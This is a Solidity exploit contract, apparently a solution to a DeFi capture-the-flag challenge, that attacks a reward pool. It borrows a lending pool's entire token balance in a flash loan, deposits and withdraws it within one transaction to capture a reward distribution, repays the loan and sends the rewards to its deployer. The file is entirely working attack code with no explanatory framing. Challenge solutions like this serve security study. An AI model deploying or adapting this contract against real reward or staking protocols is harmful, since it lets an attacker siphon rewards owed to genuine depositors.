pragma solidity ^0.8.0;

interface IFlashLoanerPool {
  function flashLoan(uint256) external;
}

interface IERC20 {
  function balanceOf(address) external returns (uint256);
  function approve(address, uint256) external;
  function transfer(address, uint256) external;
}

interface IRewarder {
  function deposit(uint256) external;
  function withdraw(uint256) external;
  function distributeRewards() external returns (uint256);
}

contract TheRewarderAttacker {
  address private immutable owner;
  address private immutable flashPool;
  address private immutable liquidityToken;
  address private immutable rewarderToken;
  address private immutable rewarderPool;

  constructor(
    address _flashPool,
    address _liquidityToken,
    address _rewarderToken,
    address _rewarderPool
  ) {
    owner = msg.sender;
    flashPool = _flashPool;
    liquidityToken = _liquidityToken;
    rewarderToken = _rewarderToken;
    rewarderPool = _rewarderPool;
  }

  function attack(
  ) external {
    uint256 poolBalance = IERC20(liquidityToken).balanceOf(flashPool);
    IFlashLoanerPool(flashPool).flashLoan(poolBalance);
    withdraw();
  }

  function receiveFlashLoan(uint256 amount) external {
    IERC20(liquidityToken).approve(rewarderPool, amount);
    IRewarder(rewarderPool).deposit(amount);
    IRewarder(rewarderPool).withdraw(amount);
    IERC20(liquidityToken).transfer(flashPool, amount);
  }

  function withdraw() public {
    IERC20(rewarderToken).transfer(owner, IERC20(rewarderToken).balanceOf(address(this)));
  }
}